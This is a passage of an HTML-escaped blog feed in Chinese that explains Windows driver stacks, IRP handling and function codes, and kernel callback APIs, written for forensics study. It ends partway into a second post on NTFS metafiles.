&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usbhub.sys（USB集线器驱动）      ← 顶层（最高层）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usbccgp.sys（通用USB类驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winusb.sys（用户模式USB驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usbport.sys（USB端口驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（控制器驱动）   ← 底层（最接近硬件）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;网络驱动栈ndis&#34;&gt;网络驱动栈（NDIS）：
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpip.sys（TCP/IP 协议驱动）      ← 顶层（协议层）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ndis.sys（NDIS 中间层驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（网卡驱动）        ← 底层（硬件驱动）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;显示设备驱动栈windows显示驱动模型wddm&#34;&gt;显示设备驱动栈（Windows显示驱动模型WDDM）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dxgkrnl.sys（DirectX 图形内核驱动）  ← 顶层（图形API接口）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;display.sys（显示驱动核心）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（显卡硬件驱动）        ← 底层（显卡硬件控制）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;音频设备驱动栈&#34;&gt;音频设备驱动栈
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;audiosrv（音频服务）                 ← 顶层（用户模式服务）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sysaudio.sys（系统音频驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HDAudio.sys（高定义音频驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（声卡厂商驱动）        ← 底层（硬件控制）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;irp&#34;&gt;IRP
&lt;/h1&gt;&lt;h2 id=&#34;irp-是什么&#34;&gt;IRP 是什么
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;IRP的全称是I/O Request Packet，即I/O 请求包&lt;/strong&gt;，是内核中用于描述和传递所有I/O请求的核心数据结构&lt;/p&gt;
&lt;p&gt;当一个I/O请求产生时，I/O管理器会创建一个IRP对象，这个IRP就像一张填写好的快递单，上面包含了所有与本次请求相关的信息，如操作类型、数据缓冲区地址、目标设备等&lt;/p&gt;
&lt;p&gt;之后，I/O管理器会将这张快递单发送给目标设备对应的驱动程序栈，驱动程序通过处理这些 IRP 来完成工作&lt;/p&gt;
&lt;p&gt;恶意软件经常通过IRP挂钩的技术来劫持系统功能，它会找到一个正常驱动的IRP处理函数地址，并将其替换为指向自己恶意代码的地址。这样，所有发往正常驱动的IRP都会先被恶意软件截胡，从而实现键盘记录、文件隐藏等功能&lt;/p&gt;
&lt;h2 id=&#34;irp在驱动栈中的传递&#34;&gt;IRP在驱动栈中的传递
&lt;/h2&gt;&lt;h3 id=&#34;irp创建&#34;&gt;IRP创建
&lt;/h3&gt;&lt;p&gt;应用程序调用如&lt;code&gt;ReadFile()&lt;/code&gt;，系统调用相关内核服务，内核根据请求生成一个IRP&lt;/p&gt;
&lt;p&gt;IRP包含请求类型、缓冲区地址、请求参数等信息&lt;/p&gt;
&lt;h3 id=&#34;irp发送到驱动栈顶层驱动&#34;&gt;IRP发送到驱动栈顶层驱动
&lt;/h3&gt;&lt;p&gt;例如，磁盘驱动栈中，顶层可能是文件系统驱动（&lt;code&gt;ntfs.sys&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;内核将IRP传递给顶层驱动的&lt;code&gt;Dispatch&lt;/code&gt;函数&lt;/p&gt;
&lt;h3 id=&#34;驱动处理irp&#34;&gt;驱动处理IRP
&lt;/h3&gt;&lt;p&gt;驱动检查IRP内容，执行相应操作（如文件系统解析、数据缓存等）&lt;/p&gt;
&lt;p&gt;驱动可以完成请求，或者决定将IRP向下传递&lt;/p&gt;
&lt;h3 id=&#34;irp向下传递给下一个驱动&#34;&gt;IRP向下传递给下一个驱动
&lt;/h3&gt;&lt;p&gt;驱动调用&lt;code&gt;IoSkipCurrentIrpStackLocation&lt;/code&gt;，跳过当前驱动的IRP堆栈位置&lt;/p&gt;
&lt;p&gt;然后调用&lt;code&gt;IoCallDriver&lt;/code&gt;把IRP传给下一个驱动，通常是更底层的驱动&lt;/p&gt;
&lt;h3 id=&#34;依次传递直到最底层驱动&#34;&gt;依次传递直到最底层驱动
&lt;/h3&gt;&lt;p&gt;IRP会层层传递，直到最底层的硬件驱动处理它&lt;/p&gt;
&lt;p&gt;底层驱动发起对硬件的实际操作，比如读写磁盘、发送网络包&lt;/p&gt;
&lt;h3 id=&#34;irp完成&#34;&gt;IRP完成
&lt;/h3&gt;&lt;p&gt;硬件操作完成后，底层驱动调用&lt;code&gt;IoCompleteRequest&lt;/code&gt;标记 IRP 完成&lt;/p&gt;
&lt;p&gt;IRP 结果逐层向上传递回去，每层驱动可以执行清理或后处理，最终结果反馈给系统和应用程序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;应用程序请求
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IRP创建
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntfs.sys（文件系统驱动）        ← 顶层
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;volmgr.sys（卷管理器驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;partmgr.sys（分区管理驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk.sys（磁盘驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;storport.sys（存储端口驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（硬件控制驱动）  ← 底层
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 硬件操作
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;硬件设备完成请求
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 结果返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;storport.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;partmgr.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;volmgr.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntfs.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;操作系统
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;常见irp主要功能码&#34;&gt;常见IRP主要功能码
&lt;/h2&gt;&lt;p&gt;每个IRP都包含一个主要功能码，用于定义本次请求的核心操作类型&lt;/p&gt;
&lt;h3 id=&#34;文件与设备管理&#34;&gt;文件与设备管理
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_create&#34;&gt;IRP_MJ_CREATE
&lt;/h4&gt;&lt;p&gt;打开或创建文件、设备句柄&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_close&#34;&gt;IRP_MJ_CLOSE
&lt;/h4&gt;&lt;p&gt;关闭文件或设备句柄&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_read&#34;&gt;IRP_MJ_READ
&lt;/h4&gt;&lt;p&gt;从文件或设备读取数据&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_write&#34;&gt;IRP_MJ_WRITE
&lt;/h4&gt;&lt;p&gt;向文件或设备写入数据&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_query_information&#34;&gt;IRP_MJ_QUERY_INFORMATION
&lt;/h4&gt;&lt;p&gt;查询文件或设备信息（大小、属性等）&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_set_information&#34;&gt;IRP_MJ_SET_INFORMATION
&lt;/h4&gt;&lt;p&gt;设置文件或设备信息（修改属性等）&lt;/p&gt;
&lt;h3 id=&#34;设备控制&#34;&gt;设备控制
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_device_control&#34;&gt;IRP_MJ_DEVICE_CONTROL
&lt;/h4&gt;&lt;p&gt;向驱动发送自定义控制命令（用户模式到驱动的常用命令）&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_internal_device_control&#34;&gt;IRP_MJ_INTERNAL_DEVICE_CONTROL
&lt;/h4&gt;&lt;p&gt;驱动间内部控制命令，供驱动程序之间通信使用&lt;/p&gt;
&lt;h3 id=&#34;即插即用pnp&#34;&gt;即插即用（PnP）
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_pnp&#34;&gt;IRP_MJ_PNP
&lt;/h4&gt;&lt;p&gt;即插即用事件通知，如设备启动、停止、移除、资源分配等&lt;/p&gt;
&lt;h3 id=&#34;电源管理&#34;&gt;电源管理
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_power&#34;&gt;IRP_MJ_POWER
&lt;/h4&gt;&lt;p&gt;电源状态管理请求，如休眠、唤醒、电源状态改变等&lt;/p&gt;
&lt;h3 id=&#34;文件系统控制&#34;&gt;文件系统控制
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_file_system_control&#34;&gt;IRP_MJ_FILE_SYSTEM_CONTROL
&lt;/h4&gt;&lt;p&gt;文件系统特定控制请求，如卷挂载、卸载等&lt;/p&gt;
&lt;h3 id=&#34;系统管理&#34;&gt;系统管理
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_shutdown&#34;&gt;IRP_MJ_SHUTDOWN
&lt;/h4&gt;&lt;p&gt;系统关机或重启时通知驱动准备关闭&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_create_mailslot&#34;&gt;IRP_MJ_CREATE_MAILSLOT
&lt;/h4&gt;&lt;p&gt;创建邮件槽（用于进程间通信）&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_query_security&#34;&gt;IRP_MJ_QUERY_SECURITY
&lt;/h4&gt;&lt;p&gt;查询安全描述符&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_set_security&#34;&gt;IRP_MJ_SET_SECURITY
&lt;/h4&gt;&lt;p&gt;设置安全描述符&lt;/p&gt;
&lt;h3 id=&#34;其他常见功能码&#34;&gt;其他常见功能码
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_query_volume_information&#34;&gt;IRP_MJ_QUERY_VOLUME_INFORMATION
&lt;/h4&gt;&lt;p&gt;查询卷信息&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_set_volume_information&#34;&gt;IRP_MJ_SET_VOLUME_INFORMATION
&lt;/h4&gt;&lt;p&gt;设置卷信息&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_cleanup&#34;&gt;IRP_MJ_CLEANUP
&lt;/h4&gt;&lt;p&gt;清理（关闭时，释放资源等）&lt;/p&gt;
&lt;h1 id=&#34;内核回调&#34;&gt;内核回调
&lt;/h1&gt;&lt;h2 id=&#34;什么是内核回调&#34;&gt;什么是内核回调
&lt;/h2&gt;&lt;p&gt;内核回调（Kernel Callbacks） 是一种事件驱动的机制&lt;/p&gt;
&lt;p&gt;它允许内核模式的驱动程序向操作系统内核注册特定的系统级事件，当这些被注册的事件发生时，内核会暂停其正常操作流程，并逐一回调所有已注册的驱动程序提供的函数，即回调例程&lt;/p&gt;
&lt;p&gt;这是内核提供的一个事件通知系统，驱动程序不再需要通过不断轮询的方式来检查某个状态是否改变，而是可以被动地、在事件发生时才被内核精准地唤醒和调用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例（用户态）：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;OnButtonClick&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;按钮被点击！&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;RegisterButtonCallback&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;OnButtonClick&lt;/span&gt;); &lt;span style=&#34;color:#7f848e&#34;&gt;// 注册回调
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;系统中，“按钮被点击”事件发生后，会自动调用注册的&lt;code&gt;OnButtonClick()&lt;/code&gt;函数&lt;/p&gt;
&lt;h2 id=&#34;内核回调工作过程&#34;&gt;内核回调工作过程
&lt;/h2&gt;&lt;h3 id=&#34;注册&#34;&gt;注册
&lt;/h3&gt;&lt;p&gt;在驱动程序的初始化阶段（通常是在&lt;code&gt;DriverEntry&lt;/code&gt;函数中），驱动程序会调用一个由内核导出的、特定于事件类型的注册函数。例如，要监控进程创建，驱动程序会调用&lt;code&gt;PsSetCreateProcessNotifyRoutine&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在调用时，驱动程序会将一个指向自己内部实现的回调函数的地址，作为一个参数传递给内核&lt;/p&gt;
&lt;p&gt;内核接收到这个请求后，会将这个函数地址添加到一个与该事件类型相关联的、内部维护的回调函数指针链表中&lt;/p&gt;
&lt;h3 id=&#34;触发&#34;&gt;触发
&lt;/h3&gt;&lt;p&gt;当一个被订阅的系统事件发生时（例如&lt;code&gt;NtCreateUserProcess&lt;/code&gt;系统调用被执行以创建一个新进程），内核在完成其核心操作的某个特定阶段，会暂停下来&lt;/p&gt;
&lt;h3 id=&#34;调用&#34;&gt;调用
&lt;/h3&gt;&lt;p&gt;内核会找到与该事件对应的回调函数指针链表，然后，它会依次遍历这个链表，并同步地调用每一个已注册的回调函数&lt;/p&gt;
&lt;p&gt;内核会将与事件相关的上下文信息（例如，对于进程创建事件，会传递新进程的PID、创建者信息等）作为参数传递给回调函数&lt;/p&gt;
&lt;h3 id=&#34;处理&#34;&gt;处理
&lt;/h3&gt;&lt;p&gt;驱动程序的回调函数被调用后，便可以在其函数体内执行自定义的逻辑&lt;/p&gt;
&lt;p&gt;它可以仅仅记录该事件，也可以进行干预，例如阻止该事件的完成（如果回调类型允许的话）&lt;/p&gt;
&lt;h2 id=&#34;常见内核回调&#34;&gt;常见内核回调
&lt;/h2&gt;&lt;h3 id=&#34;进程与线程相关回调&#34;&gt;进程与线程相关回调
&lt;/h3&gt;&lt;h4 id=&#34;pssetcreateprocessnotifyroutine&#34;&gt;PsSetCreateProcessNotifyRoutine
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：当进程创建或退出时触发&lt;/li&gt;
&lt;li&gt;用途：监控进程行为（如杀毒软件、行为分析等）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;pssetcreatethreadnotifyroutine&#34;&gt;PsSetCreateThreadNotifyRoutine
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：当线程被创建或销毁时触发&lt;/li&gt;
&lt;li&gt;用途：检测线程注入、远程线程创建&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;映像加载相关回调&#34;&gt;映像加载相关回调
&lt;/h3&gt;&lt;h4 id=&#34;pssetloadimagenotifyroutine&#34;&gt;PsSetLoadImageNotifyRoutine
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：当模块（如EXE、DLL）被加载到进程时触发&lt;/li&gt;
&lt;li&gt;用途：监视DLL是否注入或加载非法模块&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册表操作回调&#34;&gt;注册表操作回调
&lt;/h3&gt;&lt;h4 id=&#34;cmregistercallbackcmregistercallbackex&#34;&gt;CmRegisterCallback/CmRegisterCallbackEx
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：在注册表被访问（读写、删除等）时触发&lt;/li&gt;
&lt;li&gt;用途：拦截修改注册表、保护启动项&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;文件系统监控回调&#34;&gt;文件系统监控回调
&lt;/h3&gt;&lt;h4 id=&#34;fsrtlregisterfilesystemfiltercallbacks&#34;&gt;FsRtlRegisterFileSystemFilterCallbacks
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：文件系统过滤驱动使用的回调注册接口&lt;/li&gt;
&lt;li&gt;用途：监视文件访问、隐藏或加密文件等（如勒索软件防护、杀毒软件）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;电源管理与关机回调&#34;&gt;电源管理与关机回调
&lt;/h3&gt;&lt;h4 id=&#34;ioregistershutdownnotification&#34;&gt;IoRegisterShutdownNotification
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：注册系统关机前通知&lt;/li&gt;
&lt;li&gt;用途：清理资源、保存数据、记录日志&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;poregisterpowersettingcallback&#34;&gt;PoRegisterPowerSettingCallback
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：注册电源策略变化回调（如睡眠、唤醒）&lt;/li&gt;
&lt;li&gt;用途：管理节能策略或唤醒唤醒设备&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;蓝屏-bugcheck-回调&#34;&gt;蓝屏 (BugCheck) 回调
&lt;/h3&gt;&lt;h4 id=&#34;keregisterbugcheckcallback&#34;&gt;KeRegisterBugCheckCallback
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：系统蓝屏前调用，允许驱动记录崩溃状态&lt;/li&gt;
&lt;li&gt;用途：记录调试信息、保存崩溃快照&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;windows事件通知类回调&#34;&gt;Windows事件通知类回调
&lt;/h3&gt;&lt;h4 id=&#34;exregistercallback&#34;&gt;ExRegisterCallback
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：内核模块之间广播通知&lt;/li&gt;
&lt;li&gt;用途：驱动之间共享事件信息（如热插拔、电池状态）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网络相关回调&#34;&gt;网络相关回调
&lt;/h3&gt;&lt;h4 id=&#34;fwpscalloutregister&#34;&gt;FwpsCalloutRegister
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：用于网络过滤和处理框架Windows Filtering Platform注册网络流量过滤回调&lt;/li&gt;
&lt;li&gt;用途：监控/拦截网络通信（如防火墙、DLP系统）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ndisregisterprotocoldriver&#34;&gt;NdisRegisterProtocolDriver
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：注册协议驱动的接收/发送回调函数&lt;/li&gt;
&lt;li&gt;用途：网络监控、抓包、VPN实现等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安全与对象管理回调&#34;&gt;安全与对象管理回调
&lt;/h3&gt;&lt;h4 id=&#34;obregistercallbacks&#34;&gt;ObRegisterCallbacks
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：监控对象句柄操作，如进程句柄、线程句柄&lt;/li&gt;
&lt;li&gt;用途：防止进程被调试、注入、终止（常用于反作弊或病毒保护）&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>windows相关知识总结（上）</title>
        <link>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/</link>
        <pubDate>Mon, 21 Jul 2025 12:17:22 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/</guid>
        <description>&lt;p&gt;写下这篇文章的原因是因为最近在学习电子取证，使用Volatility多少得看得懂输出才行&lt;/p&gt;
&lt;p&gt;现在只是大概的了解，如果后续有时间，会把每一个板块都单独拿出来学习的&lt;/p&gt;
&lt;p&gt;嗯，如果有时间的话&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;windows相关知识总结（下）&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;ntfs文件系统&#34;&gt;NTFS文件系统
&lt;/h1&gt;&lt;h2 id=&#34;什么是ntfs&#34;&gt;什么是NTFS
&lt;/h2&gt;&lt;p&gt;NTFS，全称New Technology File System，是自WindowsNT以来微软所有现代操作系统的标准文件系统&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在NTFS卷上，一切皆文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这不仅包括我们日常所见的普通文件和目录，用于描述和管理文件系统自身的元数据也同样被组织成一系列特殊的文件，这种设计极大地增强了文件系统的灵活性和可恢复性&lt;/p&gt;
&lt;h2 id=&#34;核心元文件&#34;&gt;核心元文件
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;这是NTFS文件系统内部使用的一组以&lt;code&gt;$&lt;/code&gt;开头的特殊隐藏文件，用于维护整个文件系统的结构、状态和完整性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它们不像普通用户文件那样可见或可操作，而是被NTFS在后台自动创建和管理，保存着关于文件、目录、磁盘空间、日志、安全信息等的元数据&lt;/p&gt;
&lt;p&gt;大致结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTFS Root
